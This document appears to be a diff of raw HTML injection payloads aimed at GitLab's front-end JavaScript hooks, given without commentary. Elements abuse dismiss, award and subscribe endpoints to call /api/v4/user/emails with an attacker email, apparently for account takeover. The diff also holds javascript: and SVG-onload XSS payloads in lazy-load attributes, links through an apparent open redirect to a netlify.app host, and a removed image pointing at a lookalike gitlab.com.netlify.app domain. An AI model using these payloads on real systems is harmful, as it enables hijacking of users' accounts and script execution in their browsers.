@@ -1,42 +1,15 @@
 <div class=js-new-user-signups-cap-reached data-dismiss-endpoint=/api/v4/user/emails?email=a@p1.se data-defer-links=false data-feature-id=1><a target=x href=/\\poda-try.netlify.app class='js-close gl-opacity-0 fixed-top gl-h-full gl-w-full'>
-
+_______________________________________________________________________________________________________________________________
 <div class=js-new-mr-dashboard-banner data-dismiss-endpoint=/api/v4/user/emails?email=a@p1.se><a href=/\\poda-try.netlify.app target=x class="js-close gl-opacity-0 fixed-top gl-h-full gl-w-full">
-
+_______________________________________________________________________________________________________________________________
 <img src=x data-src=javascript:alert(2) class=lazy />
-
-
-<img src=/api/v4/user/emails?email=a@p1.se data-src=https://gitlab.com.netlify.app/api/v4/user/emails class=lazy />
-
-
-
-<img src=x data-src="data:image/svg+xml,%3Csvg width='6' height='6' onload='alert(document.domain)' viewBox='0 0 6 6' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Ccircle cx='3' cy='3' r='3' fill='white'/%3E%3C/svg%3E%0A" class=lazy />
-
-
+_______________________________________________________________________________________________________________________________
 <input type="image" class=lazy data-src="javascript:alert(document.domain)">
-
-
-
-
-
-<li class="gl-inline-block label-subscription js-label-subscription gl-ml-3 gl-mt-1">
-<button class="gl-button btn btn-sm btn-default js-subscribe-button gl-w-full" data-status="unsubscribed" data-url="/api/v4/user/emails" data-toggle="tooltip" data-container="body" title="Subscribe at project level" type="button"><span class="gl-button-text">
-Subscribe</span>
+_______________________________________________________________________________________________________________________________
+<li class="js-label-subscription">
+<button class="btn js-subscribe-button" data-url="/api/v4/user/emails" type="button">test
 </button></li>
-
-
+_______________________________________________________________________________________________________________________________
 commit and snippets
 <div class="note-awards"><div class="js-awards-block" data-award-url="/api/v4/user/emails?email=a@p1.se"><div class="js-award-holder"><button class="gl-button btn js-add-award btn-icon gl-relative" type="button">
-
-
-
-
-
-
-
-<div class="js-timeline-entry timeline-entry note-container-query-wrapper note note-wrapper note-comment note-row-3001194028 is-editable"><div class="note-awards"><div class="js-awards-block" data-award-url="/api/v4/user/emails?email=a@p1.se"><div class="js-award-holder"><button class="gl-button btn js-add-award btn-icon gl-relative" type="button"></button></div</div></div</div>
-
-
-
-
-
-
+_______________________________________________________________________________________________________________________________
